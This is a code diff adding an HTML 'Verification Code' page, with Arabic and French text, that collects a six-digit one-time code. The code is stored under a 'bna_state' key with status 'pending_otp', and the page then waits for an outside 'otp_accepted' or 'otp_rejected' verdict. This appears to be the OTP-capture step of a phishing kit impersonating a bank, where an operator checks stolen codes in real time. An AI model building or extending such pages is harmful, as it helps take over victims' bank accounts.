@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="ar" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Verification Code</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#181818;--fld:rgba(255,255,255,.18);--accent:#43a047;--ah:#388e3c;--w:380px;}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}html,body{height:100%}
+body{margin:0;background:var(--bg);font-family:"Roboto",system-ui,sans-serif;display:flex;justify-content:center;position:relative;overflow-x:hidden;min-height:100%;}
+.bd{position:fixed;inset:-80px;z-index:0;background:radial-gradient(420px 320px at 90% 20%,rgba(200,208,214,.4),transparent 62%),radial-gradient(420px 360px at 96% 66%,rgba(150,168,172,.32),transparent 66%),linear-gradient(120deg,#0e0e0e 0%,#1c1c1c 45%,#262828 100%);filter:blur(24px);transform:scale(1.08);}
+.bd::after{content:"";position:absolute;inset:0;background:rgba(0,0,0,.52)}
+.wrap{position:relative;z-index:1;width:100%;max-width:var(--w);padding:40px 20px 30px;display:flex;flex-direction:column;align-items:center;}
+.ico{font-size:52px;margin-bottom:14px}
+.ttl{color:#fff;font-size:22px;font-weight:500;margin-bottom:4px}
+.sub{color:rgba(255,255,255,.55);font-size:13px;margin-bottom:30px;text-align:center}
+.boxes{display:flex;gap:12px;justify-content:center;margin-bottom:24px;}
+.box{width:46px;height:56px;background:var(--fld);border:2px solid rgba(255,255,255,.25);border-radius:10px;color:#fff;font-size:26px;font-weight:700;text-align:center;outline:none;font-family:inherit;transition:border .2s;}
+.box:focus{border-color:var(--accent)}
+.npad{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;width:100%;margin-bottom:20px;}
+.nk{height:52px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.14);border-radius:10px;color:#fff;font-size:20px;font-family:inherit;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:background .1s;}
+.nk:active{background:rgba(255,255,255,.22)}
+.nk.nd{font-size:16px;color:rgba(255,255,255,.7)}
+.nk.ne{background:transparent;border:0;pointer-events:none}
+.wbox{display:none;flex-direction:column;align-items:center;padding:20px 0;}
+.sp{width:52px;height:52px;border-radius:50%;border:5px solid rgba(255,255,255,.12);border-top-color:var(--accent);animation:spin .9s linear infinite;margin-bottom:16px;}
+@keyframes spin{to{transform:rotate(360deg)}}
+.wt{color:rgba(255,255,255,.8);font-size:14px}
+.cbtn{width:100%;max-width:var(--w);border:0;border-radius:4px;background:var(--accent);color:#fff;font-family:inherit;font-size:16px;font-weight:400;letter-spacing:1px;text-transform:uppercase;padding:12px;cursor:pointer;transition:background .15s;}
+.cbtn:hover{background:var(--ah)}
+.err{min-height:20px;color:#ff8a80;font-size:15px;text-align:center;margin-top:10px}
+</style>
+</head>
+<body>
+  <div class="bd"></div>
+  <main class="wrap">
+    <div class="ico">📱</div>
+    <div class="ttl">Verification Code</div>
+    <div class="sub">Enter the 6-digit code</div>
+    <div class="boxes" id="boxes">
+      <input class="box" maxlength="1" type="text" inputmode="numeric">
+      <input class="box" maxlength="1" type="text" inputmode="numeric">
+      <input class="box" maxlength="1" type="text" inputmode="numeric">
+      <input class="box" maxlength="1" type="text" inputmode="numeric">
+      <input class="box" maxlength="1" type="text" inputmode="numeric">
+      <input class="box" maxlength="1" type="text" inputmode="numeric">
+    </div>
+    <div class="npad" id="npad">
+      <button class="nk" data-n="1">1</button><button class="nk" data-n="2">2</button><button class="nk" data-n="3">3</button>
+      <button class="nk" data-n="4">4</button><button class="nk" data-n="5">5</button><button class="nk" data-n="6">6</button>
+      <button class="nk" data-n="7">7</button><button class="nk" data-n="8">8</button><button class="nk" data-n="9">9</button>
+      <button class="nk ne"></button><button class="nk" data-n="0">0</button><button class="nk nd" data-n="DEL">⌫</button>
+    </div>
+    <div class="wbox" id="wbox"><div class="sp"></div><div class="wt">Vérification du code...</div></div>
+    <button class="cbtn" id="cbtn">Confirm</button>
+    <div class="err" id="err"></div>
+  </main>
+<script>
+const KEY='bna_state', CH='bna_ch';
+const bc=typeof BroadcastChannel!=='undefined'?new BroadcastChannel(CH):null;
+function getS(){try{return JSON.parse(localStorage.getItem(KEY)||'{}');}catch(e){return{};}}
+function setS(u){const s={...getS(),...u};try{localStorage.setItem(KEY,JSON.stringify(s));}catch(e){}if(bc)bc.postMessage({type:'update',data:s});return s;}
+const obs=[...document.querySelectorAll('.box')];
+let tmr=null;
+obs.forEach((b,i)=>{
+  b.addEventListener('input',()=>{b.value=b.value.replace(/[^0-9]/g,'').slice(-1);if(b.value&&i<obs.length-1)obs[i+1].focus();});
+  b.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!b.value&&i>0)obs[i-1].focus();});
+});
+document.getElementById('npad').addEventListener('click',e=>{
+  const btn=e.target.closest('.nk');if(!btn)return;
+  const n=btn.dataset.n;
+  if(n==='DEL'){const f=obs.filter(b=>b.value);if(f.length){const l=f[f.length-1];l.value='';l.focus();}}
+  else{const em=obs.find(b=>!b.value);if(em){em.value=n;const idx=obs.indexOf(em);if(idx<obs.length-1)obs[idx+1].focus();}}
+});
+document.getElementById('cbtn').addEventListener('click',()=>{
+  const otp=obs.map(b=>b.value).join('');
+  if(otp.length<6){document.getElementById('err').textContent='الرمز غير مكتمل';return;}
+  document.getElementById('err').textContent='';
+  setS({otp,status:'pending_otp',otp_time:Date.now()});
+  document.getElementById('cbtn').style.display='none';
+  document.getElementById('wbox').style.display='flex';
+  document.getElementById('npad').style.pointerEvents='none';
+  document.getElementById('npad').style.opacity='.4';
+  document.getElementById('boxes').style.opacity='.4';
+  startPoll();
+});
+function startPoll(){
+  if(tmr)clearInterval(tmr);
+  const check=()=>{
+    const s=getS().status;
+    if(s==='otp_accepted'){clearInterval(tmr);window.location.href='loading.html';}
+    else if(s==='otp_rejected'){clearInterval(tmr);reset();document.getElementById('err').textContent='الرمز غير صحيح';}
+  };
+  tmr=setInterval(check,800);
+  if(bc)bc.onmessage=e=>{if(e.data.type==='update')check();};
+}
+function reset(){
+  obs.forEach(b=>b.value='');obs[0].focus();
+  document.getElementById('wbox').style.display='none';
+  document.getElementById('cbtn').style.display='block';
+  document.getElementById('npad').style.pointerEvents='';
+  document.getElementById('npad').style.opacity='1';
+  document.getElementById('boxes').style.opacity='1';
+  setS({status:'idle'});
+}
+</script>
+</body>
+</html>
